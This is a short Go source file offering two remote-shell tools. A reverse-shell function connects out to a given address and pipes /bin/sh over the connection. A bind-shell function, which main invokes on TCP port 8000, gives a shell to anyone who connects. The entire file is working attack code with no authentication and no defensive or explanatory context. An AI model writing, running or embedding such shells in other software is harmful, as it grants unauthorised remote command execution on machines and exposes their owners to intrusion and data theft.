package shells

import (
    "os/exec"
    "net"
)


func ReverseShell(network, address, shell string){
    c, _ := net.Dial(network, address)
    cmd := exec.Command(shell)
    cmd.Stdin = c
    cmd.Stdout = c
    cmd.Stderr = c
    cmd.Run()
}


func BindShell(network, address, shell string){
	l, _ := net.Listen(network, address)
	defer l.Close()
	for {
		// Wait for a connection.
		conn, _ := l.Accept()
		// Handle the connection in a new goroutine.
		// The loop then returns to accepting, so that
		// multiple connections may be served concurrently.
		go func(c net.Conn) {
		    cmd := exec.Command(shell)
		    cmd.Stdin = c
            cmd.Stdout = c
            cmd.Stderr = c
            cmd.Run()
            defer c.Close()
		}(conn)
	}
}


func main(){
    //ReverseShell("tcp", ":8000", "/bin/sh")
    BindShell("tcp", ":8000", "/bin/sh")
}
